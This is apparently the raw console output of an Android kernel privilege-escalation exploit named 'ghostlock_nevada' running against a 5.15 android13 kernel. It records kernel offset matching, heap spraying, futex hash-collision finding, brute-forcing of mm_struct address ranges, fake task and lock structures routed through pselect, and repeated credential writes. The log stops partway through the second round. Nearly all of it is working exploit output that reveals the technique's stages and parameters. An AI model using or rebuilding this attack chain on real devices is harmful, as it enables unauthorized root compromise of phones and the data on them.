[33m[*] [0mkernel: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692
[32m[+] [0moffsets matched: 5.15.180-android13-8-00018-g9b2308ac0ad6-ab14563692 (layout nevada-5.15)
[32m[+] [0mstartup context pid=11124 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=0
[32m[+] [0mstartup limits pid=11124 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
[32m[+] [0mbuild config pid=11124 label=ghostlock_nevada slide=pselect main=pselect
[32m[+] [0mp0 profile pid=11124 phys_offset=0000000040000000 kernel_phys_load=0000000040000000 delta=0000000000000000 slide_logger=ffffff8002b01e28 bootid_data=ffffff8002dc6819 init_task=ffffff8002c43640 root_tg=ffffff8002d58ac0 sysctl_bootid=ffffff8002dc6819
[33m[*] [0m[T+0ms] exploit start
[32m[+] [0mSELinux already off
[33m[*] [0m[T+4667ms] pre-W2 drain
[33m[*] [0mperf task: 0xffffff8016c91200 (48/256 votes)
[33m[*] [0m[T+4877ms] perf_find_task done
[33m[*] [0mchild_pid=13126 child_task=0xffffff8016c91200
[33m[*] [0mround 1/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8016c91998 mode=2
[33m[*] [0m[T+9881ms]   heap spray start
[33m[*] [0mparameters cpu (16) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mstart finding collisisons
[33m[*] [0mtarget    0000007c1e2610c8
[33m[*] [0m  0000006b974dd308 t=15399
[33m[*] [0m  0000006b974e8360 t=16043
[33m[*] [0m  0000006b996cd288 t=15343
[33m[*] [0mks collisions=3/3 baseline=5 threshold=10x (50) accepted=[15343..16043] slowest_rejected=5
[33m[*] [0mfound 3 collisisons
[33m[*] [0mstart bruteforcing
[33m[*] [0m[  1] start finding mm_struct [ffffff8180000000-ffffff8300000000]
[33m[*] [0m[  7] start finding mm_struct [ffffff8a80000000-ffffff8c00000000]
[33m[*] [0m[  5] start finding mm_struct [ffffff8780000000-ffffff8900000000]
[33m[*] [0m[  3] start finding mm_struct [ffffff8480000000-ffffff8600000000]
[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8180000000]
[33m[*] [0m[  6] start finding mm_struct [ffffff8900000000-ffffff8a80000000]
[33m[*] [0m[  2] start finding mm_struct [ffffff8300000000-ffffff8480000000]
[33m[*] [0m[  4] start finding mm_struct [ffffff8600000000-ffffff8780000000]
[33m[*] [0mdone
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+20322ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff800fc90000 fake_lock=ffffff800fc90000 fake_w0=ffffff800fc90300 fake_task=ffffff800fc90400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff800fc90400 ex1=ffffff800fc90000 ex2=0000000000000003 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
[33m[*] [0mpselect post-select +201ms ret=0
[33m[*] [0mpselect returned attempt=1 ret=0 errno=0 calls=1 success=1 delay=0
[33m[*] [0mpselect route probing cfi attempt=1 ret=0 expected=9
[33m[*] [0mpselect route done calls=1 success=1 step=0 errno=0
[33m[*] [0m[T+21528ms]   PI route done
[33m[*] [0mchild uid = 9999
[33m[*] [0mround 2/10: cred write
[33m[*] [0m=== W2: cred === target=0xffffff8016c91998 mode=2
[33m[*] [0m[T+27087ms]   heap spray start
[33m[*] [0mparameters cpu (16) mm_struct sz (400) mm slab order (3) thread cnt (8) collisions (4) mte disabled
[33m[*] [0mfutex_hashsize 2048 (8 possible CPUs)
[33m[*] [0mstart finding collisisons
[33m[*] [0mtarget    0000007c1e2610c8
[33m[*] [0m  0000006b95be3398 t=15606
[33m[*] [0m  0000006b964ceaf0 t=15705
[33m[*] [0m  0000006b9669a950 t=15187
[33m[*] [0mks collisions=3/3 baseline=4 threshold=10x (40) accepted=[15187..15705] slowest_rejected=5
[33m[*] [0mfound 3 collisisons
[33m[*] [0mstart bruteforcing
[33m[*] [0m[  2] start finding mm_struct [ffffff8300000000-ffffff8480000000]
[33m[*] [0m[  4] start finding mm_struct [ffffff8600000000-ffffff8780000000]
[33m[*] [0m[  6] start finding mm_struct [ffffff8900000000-ffffff8a80000000]
[33m[*] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8180000000]
[33m[*] [0m[  7] start finding mm_struct [ffffff8a80000000-ffffff8c00000000]
[33m[*] [0m[  3] start finding mm_struct [ffffff8480000000-ffffff8600000000]
[33m[*] [0m[  5] start finding mm_struct [ffffff8780000000-ffffff8900000000]
[33m[*] [0m[  1] start finding mm_struct [ffffff8180000000-ffffff8300000000]
[33m[*] [0mdone
[33m[*] [0mprepare_kernel_page ok attempt=1
[33m[*] [0m[T+33816ms]   heap spray done
[33m[*] [0mpselect route setup attempt=1 simple=0 shift=-2 page=ffffff8007858000 fake_lock=ffffff8007858000 fake_w0=ffffff8007858300 fake_task=ffffff8007858400 in0=0000000000000000 in3=0000000000000001 out0=0000000000000000 ex0=ffffff8007858400 ex1=ffffff8007858000 ex2=0000000000000003 ex3=0000000000000000
[33m[*] [0mpselect pre-select +0ms
